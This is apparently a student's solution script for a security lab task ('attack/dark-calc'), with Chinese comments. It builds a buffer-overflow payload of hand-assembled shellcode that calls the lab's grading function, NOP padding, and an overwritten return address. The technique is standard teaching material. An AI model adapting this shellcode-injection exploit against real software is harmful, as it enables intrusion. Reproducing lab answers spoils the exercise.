#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import sys
import struct

# 在 GDB 中确认的缓冲区起始地址
buffer_addr = 0x721000800fd0

# shellcode: grade_eval(4)，随后 exit(0)
shellcode = (
    b"\xbf\x04\x00\x00\x00"       # mov edi, 4
    b"\xb8\x87\x1a\x40\x00"       # mov eax, 0x401a87
    b"\xff\xd0"                   # call rax
    b"\x31\xff"                   # xor edi, edi
    b"\xb8\x80\x18\x40\x00"       # mov eax, 0x401880
    b"\xff\xd0"                   # call rax
)

# 返回地址距 expression 起始位置 24 字节
offset = 24

# 用 NOP 补齐返回地址前的空间
payload = shellcode.ljust(offset, b"\x90")

# 覆盖 input() 的返回地址，使其跳向 shellcode
payload += struct.pack("<Q", buffer_addr)

assert len(payload) == 32
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload)
